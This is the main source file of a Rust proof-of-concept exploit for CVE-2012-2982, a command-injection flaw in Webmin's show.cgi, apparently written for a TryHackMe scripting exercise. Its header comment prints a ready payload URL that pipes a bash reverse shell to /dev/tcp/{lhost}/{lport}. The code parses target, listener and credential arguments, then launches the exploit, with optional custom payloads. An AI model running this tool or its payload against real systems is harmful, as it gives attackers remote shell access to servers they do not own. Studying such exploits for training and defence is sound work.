// # CVE-2012-2982
// 
// CVE-2012-2982 is an RCE vulnerability affecting 
// (Webmin)[https://github.com/webmin/webmin] versions 1.140..=1.590.
// 
// The vulnerability exists because of a function parameter missing input sanitization 
// in the show.cgi component (https://github.com/webmin/webmin/commit/1f1411fe7404ec3ac03e803cfa7e01515e71a213).
// 
// By including an invalid character in the path section of the URL, 
// an authenticated user can send a request to the */file/show.cgi/bin* endpoint 
// which will pipe their input to be executed by the system shell.
// 
// Conveniently, the "|" pipe character also works as an invalid character for this purpose.
// 
// The resulting exploit payload looks something like this below (*before url encoding*): <br>
// `http://{rhost}:{rport}/file/show.cgi/bin/4e2fc|bash -c 'exec bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'|`
// 
//
// ## Resources
//
// CVE-2012-2982 - NVD: https://nvd.nist.gov/vuln/detail/CVE-2012-2982
// Intro to PoC Scripting: https://tryhackme.com/room/intropocscripting

use clap::Parser;
use cve_2012_2982::{
    args::Args,
    exploit::Exploit,
};
use reqwest::{
    redirect::Policy,
    blocking::Client,
};
use std::time::Duration;


fn main() {
    let args = Args::parse();

    let client = Client::builder()
        .connect_timeout(Duration::from_secs(30))
        // Uncomment .proxy to use BurpSuite
        //.proxy(reqwest::Proxy::http("127.0.0.1:8080").expect("Invalid Proxy!"))
        .redirect(Policy::none())
        .build().expect("Invalid client configuration!");

    let mut exploit = Exploit::new(
        args.rhost,
        args.rport,
        args.lhost,
        args.lport,
        args.user,
        args.pass,
        client,
        args.dont_listen
    );

    if let Some(custom_payload) = args.payload {
        exploit.set_payload(custom_payload);
    };
    
    exploit.run();
}
